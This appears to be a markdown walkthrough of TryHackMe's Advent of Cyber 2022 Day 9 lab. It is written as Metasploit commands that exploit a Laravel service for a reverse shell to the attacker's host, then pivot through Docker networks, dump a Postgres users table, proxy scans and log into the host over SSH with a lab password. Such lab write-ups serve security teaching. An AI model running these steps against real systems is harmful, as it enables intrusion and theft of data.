# [Advent of Cyber 2022](https://tryhackme.com/room/adventofcyber4)

> Get started with Cyber Security in 24 Days - learn the basics by doing a new, beginner-friendly security challenge every day leading up to Christmas.

## Day 9: Dock the halls

scan the target

```
nmap -sV 10.10.249.228
```

![image](https://user-images.githubusercontent.com/90561566/206836994-a0fb95a9-acae-4ccf-ba35-ca6528a21ab3.png)

go to webpage, you will see it use Laravel framework

![image](https://user-images.githubusercontent.com/90561566/206840506-be217bdf-43cf-476f-9374-f90124b29f70.png)

search for exploit

![image](https://user-images.githubusercontent.com/90561566/206840698-57f8cc20-b922-498f-ba11-b61d7d792e8f.png)

```
msfconsole
```

![image](https://user-images.githubusercontent.com/90561566/206837648-bd28931c-0d84-4f9f-ade3-97692ff1269f.png)

type `info` and you will see cve here

![image](https://user-images.githubusercontent.com/90561566/206840790-4eede273-2564-40a2-b259-e541c3b1e38b.png)

```
set HttpClientTimeout 20
set rhosts 10.10.249.228
check
```

![image](https://user-images.githubusercontent.com/90561566/206837806-531454b0-ff76-47ea-80b5-e149fa8df684.png)

```
set lhost 10.8.0.74
run
```

![image](https://user-images.githubusercontent.com/90561566/206837939-35b425b2-0568-4b05-890b-43a01299d78d.png)

background the session

![image](https://user-images.githubusercontent.com/90561566/206837988-e6642782-7f7e-4a54-afa4-acd1c59a11b0.png)

update to meterpreter

```
sessions -u 1
sessions -i 2
```

![image](https://user-images.githubusercontent.com/90561566/206838093-8285c2ce-5860-45f9-9d5e-2c69a4c5bc90.png)

explore the application

![image](https://user-images.githubusercontent.com/90561566/206838159-9969a7e2-cdce-4ce3-a8dc-0d9f3081e70d.png)

![image](https://user-images.githubusercontent.com/90561566/206838186-643b9f42-691c-4d12-bfd1-5d21bff1b288.png)

resolve hostname to ip

```
resolve webservice_database
```

background session and config route table for pivoting

```
route add 172.28.101.51/32 2
```

![image](https://user-images.githubusercontent.com/90561566/206838345-54f3e8f8-8a20-4a40-b71b-2ac102b34280.png)

We can also see, due to the presence of the /.dockerenv file, that we are in a docker container. 

By default, Docker chooses a hard-coded IP to represent the host machine.

```
route add 172.17.0.1/32 2
```

dump the database schema

```
use auxiliary/scanner/postgres/postgres_schemadump
set rhosts 172.28.101.51
run
```

![image](https://user-images.githubusercontent.com/90561566/206839175-3d006527-4439-4a7f-8e43-9960f6d6fa9e.png)

```
use auxiliary/admin/postgres/postgres_sql
set rhosts 172.28.101.51
set database postgres
set sql 'select * from users'
run
```

![image](https://user-images.githubusercontent.com/90561566/206839428-c7603330-bbd1-4d31-82b7-c2bc8c8a269c.png)

create socks proxy

```
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 9050
set version 4a
run
```

![image](https://user-images.githubusercontent.com/90561566/206839549-64059aea-be38-444c-ab6f-f9da523b2996.png)

now you can use proxy through

```
proxychains nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1
```

![image](https://user-images.githubusercontent.com/90561566/206839554-7ee40680-c4dd-49d0-8de1-8431fa20d1d6.png)

SSH into the host machine from the Docker container

```
use auxiliary/scanner/ssh/ssh_login
set username santa
set password p4$$w0rd
set rhosts 172.17.0.1
run
```

now interact with opened session to grab flag

![image](https://user-images.githubusercontent.com/90561566/206840056-96f5cd4d-5e12-43f3-a8bf-6053b31c7752.png)

Answer

![image](https://user-images.githubusercontent.com/90561566/206840820-1d4b507f-fefa-495d-ae4e-c37dc1053558.png)

![image](https://user-images.githubusercontent.com/90561566/206840829-9634a7c4-c544-4e1a-a526-92f18f2fd401.png)

## Day 10: You're a mean one, Mr. Yeti





